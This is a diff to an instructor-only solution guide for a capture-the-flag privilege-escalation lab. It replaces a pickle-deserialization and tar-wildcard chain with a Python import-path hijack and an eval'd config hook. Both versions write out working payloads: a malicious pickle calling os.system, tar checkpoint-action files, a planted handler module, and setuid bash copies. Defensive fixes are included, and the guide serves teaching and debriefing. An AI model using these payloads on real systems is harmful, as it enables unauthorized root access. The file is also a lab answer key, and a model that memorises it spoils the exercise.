@@ -3,7 +3,7 @@
 **Do not link this file from student-facing pages.** It is intended for
 instructors verifying the lab and for a post-exercise debrief.
 
-## Design: one strict path, three tiers, no shortcuts
+## Design: one strict path, three tiers, three distinct bug classes
 
 Provisioned by `setup_privesc.sh` (run at container build time and by
 `scripts/reset_lab.sh`). There is exactly one account at each tier and
@@ -11,146 +11,134 @@ exactly one way to move to the next one:
 
 - **Low — `appuser`.** No group membership beyond its own, no interesting
   file access, and exactly **one** sudo grant:
-  `appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/ticket_export.py *`.
-  Nothing else. `appuser` cannot edit `ticket_export.py` (root-owned, not
+  `appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/archive_worker.py *`.
+  Nothing else. `appuser` cannot edit `archive_worker.py` (root-owned, not
   writable).
 - **Mid — `opsuser`.** Has **no valid password at all** -- the account is
   locked in `/etc/shadow`. There is nothing to brute-force, guess, or find
-  leaked in a log anywhere: the *only* way to act as `opsuser` is the Hop 1
-  exploit below. `opsuser` in turn has exactly **one** sudo grant:
+  leaked anywhere: the *only* way to act as `opsuser` is the Hop 1 exploit
+  below. `opsuser` in turn has exactly **one** sudo grant:
   `opsuser ALL=(root) NOPASSWD: /opt/shop/scripts/backup.sh`. `opsuser`
-  cannot edit `backup.sh` either (root-owned, not writable).
+  cannot edit `backup.sh` either (root-owned, not writable) -- but *can*
+  edit `backup.conf`, which is the actual Hop 2 bug.
 - **High — root.** Reached only via the Hop 2 exploit below.
 
-### Hop 1 — appuser -> opsuser: insecure deserialization (CWE-502)
+### Hop 1 — appuser -> opsuser: Python import-path hijack (CWE-427)
 
-`ticket_export.py` (see its own docstring) is a plausible internal tool --
-"re-hydrate a cached ticket-export object instead of re-querying
-everything" -- that calls `pickle.load()` on whatever file path it's
-given, with no validation. `pickle.load` executes arbitrary code embedded
-in the file via any object's `__reduce__` method. Since `appuser` can
-invoke this script *as opsuser* via the scoped sudo rule, and can point it
-at any file `appuser` itself just wrote (`/tmp` is world-writable and
-default-created files there are world-readable), `appuser` can craft a
-malicious pickle and get code execution as `opsuser`.
+`archive_worker.py` (see its own docstring) is a plausible internal tool --
+"archive processed images via a pluggable format handler, looked up by
+name from a shared outbox directory" -- that does:
 
-**Important technical subtlety that shapes the exploit's shape:** `sudo`
-authorizes based on the *real* (login) UID of the invoking process, not
-just its effective UID. That means a technique like "write a setuid
-copy of bash owned by `opsuser`, then run it later with `-p`" does *not*
-work for reaching Hop 2 -- such a binary only ever grants an *effective*
-`opsuser` identity (enough to read/write files `opsuser` owns), and
-`sudo -l` run from inside it will still show `appuser`'s own grant, not
-`opsuser`'s, because the real UID never actually changed (an unprivileged
-process cannot change its own real UID without `CAP_SETUID`, which
-`opsuser` doesn't have). The pickle payload's code, however, executes as
-a *genuine* `opsuser` process at the moment `sudo -u opsuser
-ticket_export.py` runs it -- both real and effective UID are truly
-`opsuser` for that one invocation, because `sudo` itself (running as
-root internally) performs the real UID switch before exec'ing the target.
-The correct exploit therefore chains straight into Hop 2 *from within
-that same payload*, while it is genuinely `opsuser`, rather than trying to
-carry an `opsuser` identity forward into a later, separate command.
+```python
+sys.path.insert(0, OUTBOX_DIR)
+module = __import__(handler_name)
+```
 
-### Hop 2 — opsuser -> root: tar wildcard/argument injection (GTFOBins)
+`OUTBOX_DIR` (`/opt/shop/backups/outbox/`) is owned `appuser:appuser`, mode
+755 -- world-readable so `opsuser`'s import can actually find files there,
+but only `appuser` can write into it. Since `appuser` can invoke this
+script *as opsuser* via the scoped sudo rule, and can plant any
+same-named `.py` file into `OUTBOX_DIR` first, `appuser` fully controls
+what `__import__(handler_name)` actually imports -- and that module's
+top-level code runs as `opsuser`, because `sudo` performs the real UID
+switch before `archive_worker.py` ever starts running.
+
+### Hop 2 — opsuser -> root: config-driven hook injection
 
 `backup.sh` is root-owned, mode `755` -- **not** writable by `opsuser` or
-anyone but root. It `cd`s into `/opt/shop/backups/staging/` (owned
-`opsuser:opsuser`, mode `700`) and runs `tar -czf <dest> *`. Because the
-*shell*, not `tar`, expands that glob, `opsuser` can plant filenames in
-the staging directory that `tar`'s own argument parser will interpret as
-flags rather than file names -- the classic GTFOBins `tar`
-wildcard-injection technique.
+anyone but root. It also sources `/opt/shop/scripts/backup.conf`, which
+**is** owned by `opsuser` (mode 644) -- a deliberately ordinary "ops
+configures their own notification hook" file. If that config sets
+`POST_BACKUP_HOOK`, `backup.sh` runs it with `eval`, as root, completely
+unvalidated. A scoped sudo rule and a non-editable script are not enough
+on their own when the privileged script trusts a lower-privileged
+account's *configuration*.
 
 ## Expected student path
 
-From an `appuser` shell (after Stage 9):
+**Hop 1**, from an `appuser` shell (after Stage 9):
 1. `id` -- an ordinary, unprivileged account; no interesting group.
 2. `sudo -l` -- shows exactly one rule: `(opsuser) NOPASSWD:
-   /opt/shop/scripts/ticket_export.py *`. This is the only lead.
-3. `cat /opt/shop/scripts/ticket_export.py` (world-readable) -- see it
-   calls `pickle.load()` on an attacker-controlled path. Recognize CWE-502.
-4. `cat /opt/shop/scripts/backup.sh` (also world-readable, no sudo needed
-   just to read it) -- discover the *second* bug up front: it tars
-   `/opt/shop/backups/staging/` with a bare `*` glob, and that directory
-   is `opsuser`-owned. A student who reads both scripts before touching
-   either has everything they need to chain the two in one shot.
-5. Craft a malicious pickle whose payload performs *both* exploits back to
-   back -- Hop 1's deserialization RCE, immediately followed by Hop 2's
-   tar wildcard/argument injection (GTFOBins-style) -- while the payload
-   is still genuinely running as `opsuser` (see the technical note above
-   for why this has to happen in one shot rather than across two
-   interactive sessions):
-   ```python
-   import pickle, os
-
-   CHAIN_CMD = (
-       "cd /opt/shop/backups/staging && "
-       "echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh && "
-       "touch -- '--checkpoint=1' && "
-       "touch -- '--checkpoint-action=exec=sh payload.sh' && "
-       "sudo /opt/shop/scripts/backup.sh"
-   )
-
-   class Exploit:
-       def __reduce__(self):
-           return (os.system, (CHAIN_CMD,))
-
-   with open("/tmp/payload.pkl", "wb") as f:
-       pickle.dump(Exploit(), f)
+   /opt/shop/scripts/archive_worker.py *`. This is the only lead.
+3. `cat /opt/shop/scripts/archive_worker.py` (world-readable) -- see it
+   inserts an appuser-writable directory at the *front* of `sys.path`
+   before importing a handler module by name. Recognize CWE-427.
+4. Plant a malicious handler:
+   ```bash
+   cat > /opt/shop/backups/outbox/evil.py <<'EOF'
+   import os
+   os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
+   EOF
    ```
-6. Detonate it: `sudo -u opsuser /opt/shop/scripts/ticket_export.py
-   /tmp/payload.pkl`. This one command exercises both hops: `ticket_export.py`
-   unpickles the payload as `opsuser` (Hop 1), whose `os.system` call then
-   plants the tar checkpoint files and runs `sudo backup.sh` as that same,
-   genuinely-`opsuser` process (Hop 2) -- producing a root-owned setuid
-   `/tmp/rootbash`.
-7. `/tmp/rootbash -p -c 'cat /root/final_flag'` -- root's own setuid grants
-   full effective privilege regardless of the caller's real UID, so this
-   step (unlike the `opsuser` case above) works exactly as expected.
-8. To specifically prove the Hop 1 -> Hop 2 transition (e.g. for partial
-   credit), have the same payload also copy the `opsuser`-only-readable
-   `/opt/shop/flags/stage2` somewhere `appuser` can read it, e.g. appending
-   `&& cp /opt/shop/flags/stage2 /tmp/stage2_proof.txt && chmod 644
-   /tmp/stage2_proof.txt` to `CHAIN_CMD` above.
+5. `sudo -u opsuser /opt/shop/scripts/archive_worker.py evil`
+6. `cat /opt/shop/flags/stage2` -- fails as appuser (not world-readable);
+   confirms the hop by using the mechanism itself, e.g. append
+   `os.system("cat /opt/shop/flags/stage2 > /tmp/stage2_proof.txt")` to
+   `evil.py` before running step 5, or use the setuid shell from step 4.
+
+**Hop 2**, from an `opsuser`-privileged shell (e.g. via the setuid helper
+from Hop 1, or any command run directly by the malicious handler module
+while it's genuinely `opsuser`):
+7. `sudo -l` -- shows exactly one rule: `(root) NOPASSWD:
+   /opt/shop/scripts/backup.sh`.
+8. `ls -la /opt/shop/scripts/backup.sh` -- `root:root`, mode `755`, not
+   writable. Editing it directly is not an option.
+9. `cat /opt/shop/scripts/backup.sh` (world-readable) -- see it sources
+   `backup.conf` and `eval`s a `POST_BACKUP_HOOK` from it.
+10. `ls -la /opt/shop/scripts/backup.conf` -- owned `opsuser`, writable.
+    Set the hook:
+    ```bash
+    echo 'POST_BACKUP_HOOK="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' \
+      >> /opt/shop/scripts/backup.conf
+    sudo /opt/shop/scripts/backup.sh
+    /tmp/rootbash -p
+    ```
+11. Read `/root/final_flag`.
+
+As with the previous design, note that a setuid copy of a shell only ever
+carries an *effective* identity forward for a non-root target account --
+Hop 1's payload should perform (or stage) whatever it needs while it is
+genuinely `opsuser` (both real and effective UID, which only holds for
+the lifetime of the one `sudo -u opsuser` invocation), rather than relying
+on a later, separate invocation of a planted setuid binary to pass Hop 2's
+own `sudo` check.
 
 ## Why this is a good training vulnerability
 
 - Deterministic and 100% reproducible after `reset_lab.sh` -- no reliance
   on a kernel version, timing, or an unpatched CVE.
-- Two genuinely different bug classes stacked, each requiring different
-  skills: exploit development against a Python deserialization sink for
-  Hop 1 (real coding knowledge -- understanding `__reduce__` and why
-  `pickle` is unsafe for untrusted input), and a well-known real-world
-  pentesting technique (GTFOBins-style argument injection) for Hop 2.
+- Three genuinely different bug classes across the full chain, each
+  requiring a different skill: OS command injection into a shell string
+  (Stage 9, entry), Python import search-path manipulation (Hop 1), and
+  untrusted-configuration-drives-privileged-execution (Hop 2) -- a
+  student can't reuse the same intuition three times.
 - Not `ALL=(ALL) NOPASSWD:ALL` anywhere -- both sudo rules are narrowly
   scoped to exactly one script each, which is exactly why the deeper bug
   in each script needs to be found: a scoped sudo rule is NOT
   automatically safe just because the invoking account can't edit the
-  target.
+  target script -- it can still trust something *else* the lower-privileged
+  account controls (a search path, a config file).
 - **Exactly one path exists at every tier.** Each account has exactly one
   sudo grant, each targeted script has exactly one exploitable bug, and
-  neither script nor any staging/working directory is reachable or
-  writable by an account that hasn't already completed the prior hop.
-  There is no group membership, no leaked credential, and no alternate
-  technique that shortcuts either hop -- `tests/test_privilege_escalation.py`
-  asserts the single-sudo-rule and non-writable-script properties for both
-  hops, and `opsuser` having no valid password at all rules out any
-  password-based route into that account.
+  neither script nor any writable directory/config file is reachable by
+  an account that hasn't already completed the prior hop. There is no
+  group membership, no leaked credential, and no alternate technique that
+  shortcuts either hop -- `tests/test_privilege_escalation.py` asserts the
+  single-sudo-rule and non-writable-script properties for both hops, and
+  `opsuser` having no valid password at all rules out any password-based
+  route into that account.
 
 ## Defensive fix
 
-- Never call `pickle.load()` (or any function using the `pickle` protocol
-  under the hood, including some ORMs/caches) on data whose origin isn't
-  fully trusted. Use a safe serialization format (JSON, protobuf) for
-  anything crossing a trust boundary, even an internal one.
-- Any script invoked via `sudo` that operates on a directory writable by
-  the account permitted to invoke it must never pass an unquoted/glob
-  argument straight to a program like `tar`, `chown`, `rsync`, or `chmod`
-  that treats certain argument patterns specially -- use `--` to end
-  option parsing, enumerate files explicitly, or run such tools with
-  their unsafe-feature flags disabled where available (e.g. tar's
-  `--no-auto-compress`/restricted checkpoint options).
+- Never insert an attacker-influenceable directory into `sys.path` (or any
+  other module search path) before an import. If pluggable handlers are a
+  real requirement, resolve them from a fixed, root-owned registry, not a
+  writable drop directory.
+- Never let a privileged script `source`/`eval` a configuration file
+  writable by a less-privileged account without treating that as exactly
+  as dangerous as giving that account the sudo rule directly. If per-user
+  hooks are genuinely needed, validate and allowlist them, or run the hook
+  itself at the lower privilege level, not as root.
 - Prefer dedicated service accounts with no interactive login and no sudo
   rights of their own, triggered by a systemd timer instead of a
   human/application-invoked sudo rule, for anything resembling either of
